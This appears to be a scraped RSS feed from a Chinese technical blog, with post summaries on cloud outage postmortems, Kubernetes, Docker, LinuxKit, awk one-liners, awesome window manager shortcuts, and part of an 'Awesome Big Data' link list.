&lt;p>2月28日，AWS工程师在排查Northern Virginia (US-EAST-1) Region的一个S3计费问题时，因敲错了一条playbook的参数而误删了大量的s3控制服务引发了4小时的故障。这个误操作影响了两个S3的核心系统：&lt;/p></description></item><item><title/><link>https://feisky.xyz/posts/2017-03-03-gitlab%E6%95%85%E9%9A%9C%E5%9B%9E%E9%A1%BE%E5%92%8C%E6%80%BB%E7%BB%93/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2017-03-03-gitlab%E6%95%85%E9%9A%9C%E5%9B%9E%E9%A1%BE%E5%92%8C%E6%80%BB%E7%BB%93/</guid><description>&lt;h2 id="tags-">layout: post
title: Gitlab故障回顾和总结
date: 2017-03-03 22:27:37
tags: []&lt;/h2>
&lt;h2 id="gitlab故障回顾">Gitlab故障回顾&lt;/h2>
&lt;p>1月31日，Giblab在修复一个PostgreSQL数据同步问题（DB Replication lagged too far behind）时，误将生产环境的数据删除（本来是计划删除db1上的数据，结果发现在错误的db2上操作了）。进而寻求从备份数据恢复，结果发现没有实时备份：&lt;/p></description></item><item><title/><link>https://feisky.xyz/posts/2017-03-15-kubernetes-ha/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2017-03-15-kubernetes-ha/</guid><description>&lt;h2 id="tags-kubernetes">layout: post
title: Kubernetes HA
date: 2017-03-15 18:12:47
tags: [kubernetes]&lt;/h2>
&lt;p>Kubernetes从1.5开始，通过&lt;code>kops&lt;/code>或者&lt;code>kube-up.sh&lt;/code>部署的集群会自动部署一个高可用的系统，包括&lt;/p>
&lt;ul>
&lt;li>etcd集群模式&lt;/li>
&lt;li>apiserver负载均衡&lt;/li>
&lt;li>controller manager、scheduler和cluster autoscaler自动选主（有且仅有一个运行实例）&lt;/li>
&lt;/ul>
&lt;p>如下图所示&lt;/p></description></item><item><title/><link>https://feisky.xyz/posts/2017-04-19-linuxkit/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2017-04-19-linuxkit/</guid><description>&lt;h2 id="tags-docker">layout: post
title: LinuxKit
date: 2017-04-19 11:09:53
tags: [docker]&lt;/h2>
&lt;p>&lt;a href="https://github.com/linuxkit/linuxkit">LinuxKit&lt;/a>是Docker最新发布的一个用于为容器构建安全、便携、可移植操作系统的工具包。它根据用户编写的yaml（指定kernel和基于docker image的一些列服务）自动构建一个常见虚拟化平台或云平台的虚拟机镜像，并自动运行起来。主要特性包括&lt;/p>
&lt;ul>
&lt;li>增强安全性
&lt;ul>
&lt;li>系统安全，基于MirageOS unikernel&lt;/li>
&lt;li>紧跟最新kernel并精简不必要的模块&lt;/li>
&lt;li>Immutable，只读根文件系统，根文件系统只能在构建的时候生成&lt;/li>
&lt;li>社区合作，比如&lt;a href="https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project">Kernel Self Protection Project (KSPP)&lt;/a>、&lt;a href="https://www.wireguard.io/">Wireguard&lt;/a>、&lt;a href="https://lwn.net/Articles/698226/">Landlock&lt;/a>、&lt;a href="https://mirage.io/">Mirage&lt;/a>、&lt;a href="https://github.com/docker/linuxkit/tree/master/projects/okernel">oKernel&lt;/a>、Clear Containers等&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>易用、可扩展
&lt;ul>
&lt;li>所有服务均可定制，且用户服务和系统服务都是基于docker image&lt;/li>
&lt;li>构建过程基于docker&lt;/li>
&lt;li>基于Infrakit方便部署生成的镜像&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="安装">安装&lt;/h2>
&lt;pre tabindex="0">&lt;code>git clone https://github.com/linuxkit/linuxkit $GOPATH/src/github.com/linuxkit/linuxkit
make &amp;amp;&amp;amp; make install
&lt;/code>&lt;/pre>&lt;h2 id="原理">原理&lt;/h2>
&lt;h4 id="编写yaml">编写yaml&lt;/h4>
&lt;p>LinuxKit需要编写一个yaml文件，来配置所需要的服务。可选的配置包括&lt;/p></description></item><item><title/><link>https://feisky.xyz/posts/alpine-linux/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/alpine-linux/</guid><description>&lt;h2 id="date-2016-03-26-1427">layout: &amp;ldquo;post&amp;rdquo;
title: &amp;ldquo;Alpine Linux&amp;rdquo;
date: &amp;ldquo;2016-03-26 14:27&amp;rdquo;&lt;/h2>
&lt;p>Alpine Linux&lt;/p>
&lt;p>随着Alpine Linux被越来越多的官方镜像使用，我们有必要了解一下Alpine Linux到底是个什么鬼。&lt;/p>
&lt;p>Alpine Linux 是一个面向安全应用的轻量级 Linux 发行版。它采用了musl libc和busybox以减小系统的体积和运行时资源消耗，同时还提供了自己的包管理工具apk。Alpine Linux的内核都打了grsecurity/PaX补丁，并且所有的程序都编译为Position Independent Executables (PIE) 以增强系统的安全性。&lt;/p></description></item><item><title/><link>https://feisky.xyz/posts/docker-datacenter/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/docker-datacenter/</guid><description>&lt;h2 id="tags-docker-cluster">layout: &amp;ldquo;post&amp;rdquo;
title: &amp;ldquo;Docker Datacenter&amp;rdquo;
date: &amp;ldquo;2016-02-26 17:38&amp;rdquo;
category: docker
tags: [docker, cluster]&lt;/h2>
&lt;p>Docker annonced &lt;code>Docker Datacenter (DDC)&lt;/code> at Februrary 23. It is an integrated, end-to-end platform for agile application development and management from the datacenter to the cloud.&lt;/p>
&lt;p>With Docker Datacenter, organizations are empowered to deploy a Containers as a Services (CaaS) on-premises or in your virtual private cloud. A CaaS provides an IT managed and secured application environment of content and infrastructure where developers can build and deploy applications in a self service manner.&lt;/p></description></item><item><title/><link>https://feisky.xyz/posts/googles-transition-from-single-datacenter-to-failover-to-a-native-multihomed-architecture/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/googles-transition-from-single-datacenter-to-failover-to-a-native-multihomed-architecture/</guid><description>&lt;h2 id="tags-highscalability-google">layout: &amp;ldquo;post&amp;rdquo;
title: &amp;ldquo;Google&amp;rsquo;s Transition From Single Datacenter, To Failover, To A Native Multihomed Architecture&amp;rdquo;
date: &amp;ldquo;2016-02-24 10:33&amp;rdquo;
category: cluster
tags: [highscalability, google]&lt;/h2>
&lt;p>The main idea of the paper is that the typical &lt;a href="https://en.wikipedia.org/wiki/Failover">failover&lt;/a> architecture used when moving from a single datacenter to multiple datacenters doesn’t work well in practice. What does work, where work means using fewer resources while providing high availability and consistency, is a &lt;strong>natively multihomed architecture&lt;/strong>:&lt;/p>
&lt;blockquote>
&lt;p>Our current approach is to build natively multihomed systems. Such systems &lt;strong>run hot in multiple datacenters all the time, and adaptively move load between datacenters&lt;/strong>, with the ability to handle outages of any scale completely transparently. Additionally, planned datacenter outages and maintenance events are completely transparent, causing minimal disruption to the operational systems. In the past, such events required labor-intensive efforts to move operational systems from one datacenter to another&lt;/p></description></item><item><title/><link>https://feisky.xyz/posts/hello-world-to-docker-mac/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/hello-world-to-docker-mac/</guid><description>&lt;h2 id="date-2016-04-15-1634">layout: &amp;ldquo;post&amp;rdquo;
title: &amp;ldquo;Hello world to Docker Mac&amp;rdquo;
date: &amp;ldquo;2016-04-15 16:34&amp;rdquo;&lt;/h2>
&lt;p>终于等到了Docker for Mac。如之前期待的，体验真的很棒：&lt;/p>
&lt;ul>
&lt;li>安装简单了，标准的Mac Application
&lt;img src="https://feisky.xyz/images/docker-mac-setting.png" alt="">&lt;/li>
&lt;li>VPN无障碍&lt;/li>
&lt;li>原生的（osxfs）文件系统共享（其实还支持9p方式）&lt;/li>
&lt;li>Docker Application管理 xhyve VM，更改配置后会自动重启&lt;/li>
&lt;li>速度快，在使用体验上跟在Linux上面已经差别不大&lt;/li>
&lt;li>可以与docker toolbox共存：Docker for Mac也会像Linux上面一样监听一个&lt;code>/var/run/docker.sock&lt;/code>，这样客户端默认情况下就会走它的API；但也可以通过环境变量告诉docker CLI调用其他Docker Daemon的API（比如docker-machine管理的vm等）&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://feisky.xyz/images/docker-for-mac-and-toolbox.png" alt="">&lt;/p></description></item><item><title/><link>https://feisky.xyz/posts/kubernetes-drain/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/kubernetes-drain/</guid><description>&lt;h2 id="date-2016-02-17-1857">layout: &amp;ldquo;post&amp;rdquo;
title: &amp;ldquo;Kubernetes drain&amp;rdquo;
date: &amp;ldquo;2016-02-17 18:57&amp;rdquo;&lt;/h2>
&lt;p>Kubernetes v1.2以前，如果想要对某个NODE（也就是Kubelet和Docker所在的机器）进行维护（比如升级Docker或者内核等）又不想影响运行中的Pod的话，需要手动做很多的步骤：&lt;/p></description></item><item><title/><link>https://feisky.xyz/posts/kubernetes-network-policy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/kubernetes-network-policy/</guid><description>&lt;h2 id="date-2016-02-17-1853">layout: &amp;ldquo;post&amp;rdquo;
title: &amp;ldquo;Kubernetes network policy&amp;rdquo;
date: &amp;ldquo;2016-02-17 18:53&amp;rdquo;&lt;/h2>
&lt;p>Kubernetes network policy&lt;/p>
&lt;p>Kubernetes社区（确切的说是Kubernetes Network SIG [1]）正在讨论Network Policy Proposal，以实现SDN、网络隔离、IP Overlapping等[2]复杂的网络需求。&lt;/p></description></item><item><title>Apache的Mesos和Google的Kubernetes 有什么区别</title><link>https://feisky.xyz/posts/2015-02-06-apachemesosgooglekubernetes-/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-06-apachemesosgooglekubernetes-/</guid><description>&lt;p>Kubernetes是一个开源项目，它把谷歌的集群管理工具引入到虚拟机和裸机场景中。它可以完美运行在现代的操作系统环境（比如CoreOS和Red Hat Atomic），并提供可以被你管控的轻量级的计算节点。Kubernetes使用Golang开发，具有轻量化、模块化、便携以及可扩展的特点。我们（Kubernetes开发团队）正在和一些不同的技术公司（包括维护着Mesos项目的MesoSphere）合作来把Kubernetes升级为一种与计算集群交互的标准方式。Kubernetes重新实现了Google在构建集群应用时积累的经验。这些概念包括如下内容：&lt;/p></description></item><item><title>awesome quick start</title><link>https://feisky.xyz/posts/2015-03-20-awesome-quick-start/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-20-awesome-quick-start/</guid><description>&lt;p>awesome是Linux平台出色的窗口管理器，具有速度快、界面简捷等优点。其安装也比较简单：&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo apt-get install -y awesome awesome-extra gnome-settings-daemon nautilus
sudo apt-get install -y --no-install-recommends gnome-session
mkdir -p ~/.config/awesome
&lt;/code>&lt;/pre>&lt;p>常用快捷键整理：&lt;/p>
&lt;pre>&lt;code>切换程序
切换到下一个程序：Mod4 + j
切换到上一个程序：Mod4 + k
切换到主窗口中的第一个程序：Mod4 + Ctrl + Return

切换tag
切换到上一个选择的tag：Mod4 + Esc
切换到某个指定的tag：Mod4 + 1-9
切换到前一个tag：Mod4 + Left
切换到下一个tag：Mod4 + Right

程序窗口状态修改
最大化/非最大化：Mod4 + m
浮动/平铺：Mod4 + Ctrl + Space
最小化：Mod4 + n
从最小化中恢复：Mod4 + Ctrl + n
关闭程序：Mod4 + Shift + C

程序窗口的转移和显示
转移到某个tag：Mod4 + Shift + 1-9（或在某个tag名上按Mod4+鼠标左键）
增加到某些tag：Mod4 + Shift + Ctrl + 1-9
转移到下一个窗口中的位置：Mod4 + Shift + j
转移到上一个窗口中的位置：Mod4 + Shift + k

布局修改
当前程序窗口宽度增加5％：Mod4 + Shift + h
当前程序窗口宽度减少5％：Mod4 + Shift + l
切换到下一种布局方式：Mod4 + Space
切换到上一种布局方式：Mod4 + Ctrl + Space

窗口管理
重启awesome：Mod4 + Ctrl + r
退出awesome：Mod4 + Shift + q
运行某个命令：Mod4 + r
打开awesome菜单：Mod4 + w

多显示器下的操作
切换到下一个屏幕：Mod4 + Ctrl + j
切换到上一个屏幕：Mod4 + Ctrl + k
将程序发送到下一个屏幕：Mod4 + o
&lt;/code>&lt;/pre></description></item><item><title>awk examples</title><link>https://feisky.xyz/posts/2015-01-28-awk-examples/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-01-28-awk-examples/</guid><description>&lt;ul>
&lt;li>precede each line by line number&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>awk &lt;span style="color:#e6db74">&amp;#39;{print NR, $0}&amp;#39;&lt;/span> filename
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>replace first field by line number&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>awk &lt;span style="color:#e6db74">&amp;#39;{$1=NR; print}&amp;#39;&lt;/span> filename
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>print field 1 and field 2&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>awk &lt;span style="color:#e6db74">&amp;#39;{print $1,$2}&amp;#39;&lt;/span> fielname
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>print last field&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>awk &lt;span style="color:#e6db74">&amp;#39;{print $NF}&amp;#39;&lt;/span> filename
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>print non empty lines&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>awk &lt;span style="color:#e6db74">&amp;#39;NF&amp;gt;0{print $0}&amp;#39;&lt;/span> filename
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>print if more than 4 fields&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>awk &lt;span style="color:#e6db74">&amp;#39;NF&amp;gt;4{print $0}&amp;#39;&lt;/span> filename
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>print matching lines (egrep)&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>awk &lt;span style="color:#e6db74">&amp;#39;/test.*/{print $0}&amp;#39;&lt;/span> filename
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>print lines where first field matches&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>awk &lt;span style="color:#e6db74">&amp;#39;$1 ~ /^print.*/{print $0}&amp;#39;&lt;/span> filename
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>calcuting sum of field 2&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>awk &lt;span style="color:#e6db74">&amp;#39;BEGIN{sum=0}{sum+=$2}END{print sum}&amp;#39;&lt;/span> filename
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>for loop&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>awk &lt;span style="color:#e6db74">&amp;#39;{sum=0; for(i=1;i&amp;lt;=NF;i++)sum+=$i; print sum}&amp;#39;&lt;/span> filename
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>make arrays&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>awk &lt;span style="color:#e6db74">&amp;#39;{n = split($0, array); print array[1], array[3]} &amp;#39;&lt;/span> filename 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>reverse a file&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>awk &lt;span style="color:#e6db74">&amp;#39;{x[NR]=$0} END{for(i=NR;i&amp;gt;0;i--)print x[i]}&amp;#39;&lt;/span> filename 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Associative Arrays&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>awk &lt;span style="color:#e6db74">&amp;#39;{amount[$1]=$2} END{for(name in amount) print name, amount[name]}&amp;#39;&lt;/span> filename
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>bigdata</title><link>https://feisky.xyz/posts/2015-01-27-bigdata/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-01-27-bigdata/</guid><description>&lt;h1 id="awesome-big-data">Awesome Big Data&lt;/h1>
&lt;p>A curated list of awesome big data frameworks, resources and other awesomeness. Inspired by &lt;a href="https://github.com/ziadoz/awesome-php">awesome-php&lt;/a>, &lt;a href="https://github.com/vinta/awesome-python">awesome-python&lt;/a>, &lt;a href="https://github.com/Sdogruyol/awesome-ruby">awesome-ruby&lt;/a>, &lt;a href="http://hadoopecosystemtable.github.io/">hadoopecosystemtable&lt;/a> &amp;amp; &lt;a href="http://blog.andreamostosi.name/big-data/">big-data&lt;/a>.&lt;/p>
&lt;p>Your contributions are always welcome!&lt;/p>
&lt;ul>
&lt;li>&lt;a href="#awesome-bigdata">Awesome Big Data&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#frameworks">Frameworks&lt;/a>&lt;/li>
&lt;li>&lt;a href="#distributed-programming">Distributed Programming&lt;/a>&lt;/li>
&lt;li>&lt;a href="#distributed-filesystem">Distributed Filesystem&lt;/a>&lt;/li>
&lt;li>&lt;a href="#key-map-data-model">Key-Map Data Model&lt;/a>&lt;/li>
&lt;li>&lt;a href="#document-data-model">Document Data Model&lt;/a>&lt;/li>
&lt;li>&lt;a href="#key-value-data-model">Key-value Data Model&lt;/a>&lt;/li>
&lt;li>&lt;a href="#graph-data-model">Graph Data Model&lt;/a>&lt;/li>
&lt;li>&lt;a href="#newsql-databases">NewSQL Databases&lt;/a>&lt;/li>
&lt;li>&lt;a href="#columnar-databases">Columnar Databases&lt;/a>&lt;/li>
&lt;li>&lt;a href="#time-series-databases">Time-Series Databases&lt;/a>&lt;/li>
&lt;li>&lt;a href="#sql-like-processing">SQL-like processing&lt;/a>&lt;/li>
&lt;li>&lt;a href="#integrated-development-environments">Integrated Development Environments&lt;/a>&lt;/li>
&lt;li>&lt;a href="#data-ingestion">Data Ingestion&lt;/a>&lt;/li>
&lt;li>&lt;a href="#service-programming">Service Programming&lt;/a>&lt;/li>
&lt;li>&lt;a href="#scheduling">Scheduling&lt;/a>&lt;/li>
&lt;li>&lt;a href="#machine-learning">Machine Learning&lt;/a>&lt;/li>
&lt;li>&lt;a href="#benchmarking">Benchmarking&lt;/a>&lt;/li>
&lt;li>&lt;a href="#security">Security&lt;/a>&lt;/li>
&lt;li>&lt;a href="#system-deployment">System Deployment&lt;/a>&lt;/li>
&lt;li>&lt;a href="#applications">Applications&lt;/a>&lt;/li>
&lt;li>&lt;a href="#search-engine-and-framework">Search engine and framework&lt;/a>&lt;/li>
&lt;li>&lt;a href="#mysql-forks-and-evolutions">MySQL forks and evolutions&lt;/a>&lt;/li>
&lt;li>&lt;a href="#postgresql-forks-and-evolutions">PostgreSQL forks and evolutions&lt;/a>&lt;/li>
&lt;li>&lt;a href="#memcached-forks-and-evolutions">Memcached forks and evolutions&lt;/a>&lt;/li>
&lt;li>&lt;a href="#embedded-databases">Embedded Databases&lt;/a>&lt;/li>
&lt;li>&lt;a href="#business-intelligence">Business Intelligence&lt;/a>&lt;/li>
&lt;li>&lt;a href="#data-visualization">Data Visualization&lt;/a>&lt;/li>
&lt;li>&lt;a href="#internet-of-things-and-sensor-data">Internet of things and sensor data&lt;/a>&lt;/li>
&lt;li>&lt;a href="#interesting-readings">Interesting Readings&lt;/a>&lt;/li>
&lt;li>&lt;a href="#interesting-papers">Interesting Papers&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#other-awesome-lists">Other Awesome Lists&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="frameworks">Frameworks&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="http://hadoop.apache.org/">Apache Hadoop&lt;/a> - framework for distributed processing. Integrates MapReduce (parallel processing), YARN (job scheduling) and HDFS (distributed file system).&lt;/li>
&lt;/ul>
&lt;h2 id="distributed-programming">Distributed Programming&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/addthis/hydra">AddThis Hydra&lt;/a> - distributed data processing and storage system originally developed at AddThis.&lt;/li>
&lt;li>&lt;a href="http://databricks.github.io/simr/">AMPLab SIMR&lt;/a> - run Spark on Hadoop MapReduce v1.&lt;/li>
&lt;li>&lt;a href="http://crunch.apache.org/">Apache Crunch&lt;/a> - a simple Java API for tasks like joining and data aggregation that are tedious to implement on plain MapReduce.&lt;/li>
&lt;li>&lt;a href="http://incubator.apache.org/projects/datafu.html">Apache DataFu&lt;/a> - collection of user-defined functions for Hadoop and Pig developed by LinkedIn.&lt;/li>
&lt;li>&lt;a href="http://flink.incubator.apache.org/">Apache Flink&lt;/a> - high-performance runtime, and automatic program optimization.&lt;/li>
&lt;li>&lt;a href="http://gora.apache.org/">Apache Gora&lt;/a> - framework for in-memory data model and persistence.&lt;/li>
&lt;li>&lt;a href="http://hama.apache.org/">Apache Hama&lt;/a> - BSP (Bulk Synchronous Parallel) computing framework.&lt;/li>
&lt;li>&lt;a href="http://wiki.apache.org/hadoop/MapReduce/">Apache MapReduce&lt;/a> - programming model for processing large data sets with a parallel, distributed algorithm on a cluster.&lt;/li>
&lt;li>&lt;a href="https://pig.apache.org/">Apache Pig&lt;/a> - high level language to express data analysis programs for Hadoop.&lt;/li>
&lt;li>&lt;a href="http://incubator.apache.org/s4/">Apache S4&lt;/a> - framework for stream processing, implementation of S4.&lt;/li>
&lt;li>&lt;a href="http://spark.incubator.apache.org/">Apache Spark&lt;/a> - framework for in-memory cluster computing.&lt;/li>
&lt;li>&lt;a href="http://spark.incubator.apache.org/docs/0.7.3/streaming-programming-guide.html">Apache Spark Streaming&lt;/a> - framework for stream processing, part of Spark.&lt;/li>
&lt;li>&lt;a href="http://storm-project.net/">Apache Storm&lt;/a> - framework for stream processing by Twitter also on YARN.&lt;/li>
&lt;li>&lt;a href="http://tez.incubator.apache.org/">Apache Tez&lt;/a> - application framework for executing a complex DAG (directed acyclic graph) of tasks, built on YARN.&lt;/li>
&lt;li>&lt;a href="https://incubator.apache.org/projects/twill.html">Apache Twill&lt;/a> - abstraction over YARN that reduces the complexity of developing distributed applications.&lt;/li>
&lt;li>&lt;a href="http://cascalog.org/">Cascalog&lt;/a> - data processing and querying library.&lt;/li>
&lt;li>&lt;a href="http://vldbarc.org/pvldb/vldb2010/pvldb_vol3/I08.pdf">Cheetah&lt;/a> - High Performance, Custom Data Warehouse on Top of MapReduce.&lt;/li>
&lt;li>&lt;a href="http://www.cascading.org/">Concurrent Cascading&lt;/a> - framework for data management/analytics on Hadoop.&lt;/li>
&lt;li>&lt;a href="https://github.com/damballa/parkour">Damballa Parkour&lt;/a> - MapReduce library for Clojure.&lt;/li>
&lt;li>&lt;a href="https://github.com/datasalt/pangool">Datasalt Pangool&lt;/a> - alternative MapReduce paradigm.&lt;/li>
&lt;li>&lt;a href="https://www.datatorrent.com/">DataTorrent StrAM&lt;/a> - real-time engine is designed to enable distributed, asynchronous, real time in-memory big-data computations in as unblocked a way as possible, with minimal overhead and impact on performance.&lt;/li>
&lt;li>&lt;a href="https://www.facebook.com/notes/facebook-engineering/under-the-hood-scheduling-mapreduce-jobs-more-efficiently-with-corona/10151142560538920">Facebook Corona&lt;/a> - Hadoop enhancement which removes single point of failure.&lt;/li>
&lt;li>&lt;a href="http://peregrine_mapreduce.bitbucket.org/">Facebook Peregrine&lt;/a> - Map Reduce framework.&lt;/li>
&lt;li>&lt;a href="https://www.facebook.com/notes/facebook-engineering/under-the-hood-data-diving-with-scuba/10150599692628920">Facebook Scuba&lt;/a> - distributed in-memory datastore.&lt;/li>
&lt;li>&lt;a href="http://googledevelopers.blogspot.it/2014/06/cloud-platform-at-google-io-new-big.html">Google Dataflow&lt;/a> - create data pipelines to help themæingest, transform and analyze data.&lt;/li>
&lt;li>&lt;a href="http://research.google.com/archive/mapreduce.html">Google MapReduce&lt;/a> - map reduce framework.&lt;/li>
&lt;li>&lt;a href="http://research.google.com/pubs/pub41378.html">Google MillWheel&lt;/a> - fault tolerant stream processing framework.&lt;/li>
&lt;li>&lt;a href="https://code.google.com/p/jaql/">JAQL&lt;/a> - declarative programming language for working with structured, semi-structured and unstructured data.&lt;/li>
&lt;li>&lt;a href="http://kitesdk.org/docs/current/">Kite&lt;/a> - is a set of libraries, tools, examples, and documentation focused on making it easier to build systems on top of the Hadoop ecosystem.&lt;/li>
&lt;li>&lt;a href="http://druid.io/">Metamarkers Druid&lt;/a> - framework for real-time analysis of large datasets.&lt;/li>
&lt;li>&lt;a href="https://github.com/Netflix/PigPen">Netflix PigPen&lt;/a> - map-reduce for Clojure whiche compiles to Apache Pig.&lt;/li>
&lt;li>&lt;a href="http://discoproject.org/">Nokia Disco&lt;/a> - MapReduce framework developed by Nokia.&lt;/li>
&lt;li>&lt;a href="http://engineering.pinterest.com/post/91288882494/pinlater-an-asynchronous-job-execution-system">Pinterest Pinlater&lt;/a> - asynchronous job execution system.&lt;/li>
&lt;li>&lt;a href="http://pydoop.sourceforge.net/docs/">Pydoop&lt;/a> - Python MapReduce and HDFS API for Hadoop.&lt;/li>
&lt;li>&lt;a href="http://stratosphere.eu/">Stratosphere&lt;/a> - general purpose cluster computing framework.&lt;/li>
&lt;li>&lt;a href="https://streamdrill.com/">Streamdrill&lt;/a> - usefull for counting activities of event streams over different time windows and finding the most active one.&lt;/li>
&lt;li>&lt;a href="https://github.com/twitter/scalding">Twitter Scalding&lt;/a> - Scala library for Map Reduce jobs, built on Cascading.&lt;/li>
&lt;li>&lt;a href="https://github.com/twitter/summingbird">Twitter Summingbird&lt;/a> - Streaming MapReduce with Scalding and Storm, by Twitter.&lt;/li>
&lt;li>&lt;a href="https://blog.twitter.com/2014/tsar-a-timeseries-aggregator">Twitter TSAR&lt;/a> - TimeSeries AggregatoR by Twitter.&lt;/li>
&lt;/ul>
&lt;h2 id="distributed-filesystem">Distributed Filesystem&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="http://hadoop.apache.org/">Apache HDFS&lt;/a> - a way to store large files across multiple machines.&lt;/li>
&lt;li>&lt;a href="http://www.fhgfs.com/cms/">BeeGFS&lt;/a> - formerly FhGFS, parallel distributed file system.&lt;/li>
&lt;li>&lt;a href="http://ceph.com/ceph-storage/file-system/">Ceph Filesystem&lt;/a> - software storage platform designed.&lt;/li>
&lt;li>&lt;a href="http://disco.readthedocs.org/en/latest/howto/ddfs.html">Disco DDFS&lt;/a> - distributed filesystem.&lt;/li>
&lt;li>&lt;a href="https://www.facebook.com/note.php?note_id=76191543919">Facebook Haystack&lt;/a> - object storage system.&lt;/li>
&lt;li>&lt;a href="https://google.com/">Google Colossus&lt;/a> - distributed filesystem (GFS2).&lt;/li>
